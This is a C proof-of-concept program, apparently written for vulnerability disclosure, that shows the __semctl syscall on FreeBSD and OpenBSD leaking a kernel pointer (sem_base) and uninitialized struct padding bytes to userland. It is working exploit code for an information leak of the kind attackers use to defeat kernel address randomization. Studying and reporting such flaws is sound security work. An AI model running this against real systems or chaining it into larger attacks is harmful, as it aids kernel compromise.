//In the __semctl syscall, the kernel copies a the semid_ds structure to
//userland when the SEM_STAT or IPC_STAT command is given (see kern_semctl in
//sys/kern/sysv_sem.c). Inside of the copied structure, is a pointer to the
//struct sem that represents the first semaphore in the set. This pointer is
//included in the copied structure, and thus we can leak a kernel pointer via
//the semid_ds.sem_base field.
//
//Additionally, the entire semid_ds structure is copied back to userland without
//zeroing it in the __semctl syscall, thus leaking 10 padding bytes.
//Interestingly, the freebsd7___semctl syscall (the COMPAT7 version of __semctl)
//makes sure to zeroize the structure before copying it, but the main one does
//not. While in theory this copy should leak bytes from the kernel stack, in all
//test runs on FreeBSD, these bytes have been zero. However, on OpenBSD, we were
//able to leak bytes in the struct's padding.

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define _WANT_SEMUN
#include <sys/sem.h>
#include <sys/syscall.h>

int main(int argc, char ** argv)
{
	int i, * sems;
	unsigned char * ptr;
	int max = 1;
	int allocated = 0;
	union semun arg;
	struct semid_ds ds;

	if(argc > 1)
		max = atoi(argv[1]);
	sems = (int *)calloc(max, sizeof(int));

	for(i = 0; i < max; i++)
	{
		sems[i] = semget(IPC_PRIVATE, 1, 0666);
		if(sems[i] < 0) {
			printf("semget failed (errno %d: %s)\n", errno, strerror(errno));
			break;
		}
		allocated++;
		printf("%d: sem 0x%X\n", i, sems[i]);

		memset(&ds, 0xAA, sizeof(ds));
		arg.buf = &ds;
#ifdef __FreeBSD__
		if(__syscall(510, sems[i], 1, IPC_STAT, &arg) < 0) { //510 = __semctl
#else //OpenBSD
		if(syscall(295, sems[i], 1, IPC_STAT, &arg) < 0) { //295 = __semctl
#endif
			printf("semctl failed (errno %d: %s)\n", errno, strerror(errno));
		} else {
			printf("sem_perm.cuid = %u\n", ds.sem_perm.cuid);
			printf("sem_perm.cgid = %u\n", ds.sem_perm.cgid);
			printf("sem_perm.uid = %u\n", ds.sem_perm.uid);
			printf("sem_perm.gid = %u\n", ds.sem_perm.gid);
			printf("sem_perm.mode = %hu\n", ds.sem_perm.mode);
			printf("sem_perm.seq = %hu\n", ds.sem_perm.seq);
			ptr = ((unsigned char *)&ds.sem_perm.seq) + sizeof(unsigned short);
			printf("leaked pad1 = %02X %02X %02X %02X        <----- Leaked uninitialized kernel memory\n", ptr[0], ptr[1], ptr[2], ptr[3]);
			printf("sem_perm.key = %ld\n", ds.sem_perm.key);
#ifdef __FreeBSD__
			printf("sem_base = %p    <----- Kernel Pointer\n", ds.__sem_base);
#else //OpenBSD
			printf("sem_base = %p    <----- Kernel Pointer\n", ds.sem_base);
#endif
			printf("sem_nsems = %hu\n", ds.sem_nsems);
			ptr = ((unsigned char *)&ds.sem_nsems) + sizeof(unsigned short);
			printf("leaked pad2 = %02X %02X %02X %02X %02X %02X  <----- Leaked uninitialized kernel memory\n", ptr[0], ptr[1], ptr[2], ptr[3], ptr[4], ptr[5]);
			printf("sem_otime = %ld\n", ds.sem_otime);
			printf("sem_ctime = %ld\n", ds.sem_ctime);
		}
	}

	for(i = 0; i < max && i < allocated; i++)
	{
		if(semctl(sems[i], 1, IPC_RMID, NULL) < 0) {
			printf("semctl to remove the semaphore failed (errno %d: %s)\n", errno, strerror(errno));
			return 1;
		}
	}

	return 0;
}
